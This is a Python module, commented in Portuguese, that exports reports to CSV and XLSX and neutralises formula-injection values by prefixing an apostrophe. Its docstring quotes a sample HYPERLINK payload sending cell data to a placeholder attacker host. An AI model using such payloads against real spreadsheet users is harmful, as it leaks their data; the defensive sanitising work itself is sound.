"""
app/shared/exporter.py
Utilitário genérico para exportação de relatórios em CSV e XLSX.
"""

import io
import csv
from typing import Sequence, Any
import openpyxl
from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
from openpyxl.utils import get_column_letter

# Caracteres que o Excel/LibreOffice/Sheets interpretam como in\u00edcio de
# f\u00f3rmula quando s\u00e3o o primeiro caractere de uma c\u00e9lula.
_CARACTERES_FORMULA = ("=", "+", "-", "@", "\t", "\r")


def _neutralizar_formula(item: Any) -> str:
    """Converte a c\u00e9lula para string, prefixando com ap\u00f3strofo se o valor
    textual come\u00e7ar com um gatilho de f\u00f3rmula.

    Os dados exportados v\u00eam de campos livres preenchidos por usu\u00e1rios
    (descri\u00e7\u00e3o de pane, observa\u00e7\u00f5es de inspe\u00e7\u00e3o, t\u00edtulo de tarefa). Sem
    isso, um valor como `=HYPERLINK("http://atacante/?d="&A1,"clique")`
    executa no Excel/LibreOffice de quem abrir o relat\u00f3rio exportado \u2014 CSV/
    Formula Injection (OWASP). O ap\u00f3strofo faz a planilha tratar o conte\u00fado
    como texto literal, sem alterar o valor vis\u00edvel para o usu\u00e1rio.

    N\u00fameros (`int`/`float`) nunca s\u00e3o neutralizados \u2014 um `-5` leg\u00edtimo
    (ex.: varia\u00e7\u00e3o negativa numa m\u00e9trica) n\u00e3o \u00e9 um gatilho de f\u00f3rmula nesse
    contexto, \u00e9 s\u00f3 um n\u00famero negativo, e n\u00e3o deve ganhar um ap\u00f3strofo
    vis\u00edvel. A checagem de tipo acontece ANTES da convers\u00e3o para string,
    ent\u00e3o isso n\u00e3o depende do texto resultante come\u00e7ar com "-".
    """
    if item is None:
        return ""
    if isinstance(item, (int, float)) and not isinstance(item, bool):
        return str(item)
    texto = str(item)
    if texto and texto[0] in _CARACTERES_FORMULA:
        return "'" + texto
    return texto


def _formatar_linha(row: Sequence[Any]) -> list[str]:
    return [_neutralizar_formula(item) for item in row]


def gerar_csv(headers: list[str], rows: Sequence[Sequence[Any]]) -> str:
    """Gera uma string CSV formatada (UTF-8 com BOM para Excel carregar acentos corretamente)."""
    output = io.StringIO()
    # Ecrever BOM UTF-8
    output.write("\ufeff")
    writer = csv.writer(output, delimiter=";", quoting=csv.QUOTE_MINIMAL)
    writer.writerow(headers)
    for row in rows:
        writer.writerow(_formatar_linha(row))
    return output.getvalue()


def gerar_xlsx(titulo_aba: str, headers: list[str], rows: Sequence[Sequence[Any]]) -> bytes:
    """Gera os bytes de um arquivo Excel (.xlsx) estilizado."""
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = titulo_aba[:31]  # Limite do Excel de 31 caracteres para abas

    # Estilos
    header_font = Font(name="Calibri", size=11, bold=True, color="FFFFFF")
    header_fill = PatternFill(start_color="1F497D", end_color="1F497D", fill_type="solid")
    header_alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)

    data_font = Font(name="Calibri", size=10)
    thin_border = Border(
        left=Side(style="thin", color="D9D9D9"),
        right=Side(style="thin", color="D9D9D9"),
        top=Side(style="thin", color="D9D9D9"),
        bottom=Side(style="thin", color="D9D9D9")
    )

    # Escrever Cabeçalho
    ws.append(headers)
    for col_num in range(1, len(headers) + 1):
        cell = ws.cell(row=1, column=col_num)
        cell.font = header_font
        cell.fill = header_fill
        cell.alignment = header_alignment

    # Escrever Linhas de Dados + acumular a largura máxima de cada coluna na
    # MESMA passada (item #7/Etapa 5: antes, `for col in ws.columns` releia
    # todas as células já escritas numa segunda passada completa só para
    # calcular largura — dobra o custo de CPU proporcional ao volume
    # exportado, sem reduzir o pico de memória do Workbook em si).
    largura_maxima = [len(h) for h in headers]
    for row_idx, row_data in enumerate(rows, start=2):
        linha_formatada = _formatar_linha(row_data)
        ws.append(linha_formatada)
        for col_idx in range(1, len(headers) + 1):
            cell = ws.cell(row=row_idx, column=col_idx)
            cell.font = data_font
            cell.border = thin_border
            if col_idx <= len(largura_maxima):
                largura_maxima[col_idx - 1] = max(largura_maxima[col_idx - 1], len(str(cell.value or "")))

    for col_idx, max_len in enumerate(largura_maxima, start=1):
        ws.column_dimensions[get_column_letter(col_idx)].width = max(max_len + 4, 12)

    output = io.BytesIO()
    wb.save(output)
    return output.getvalue()
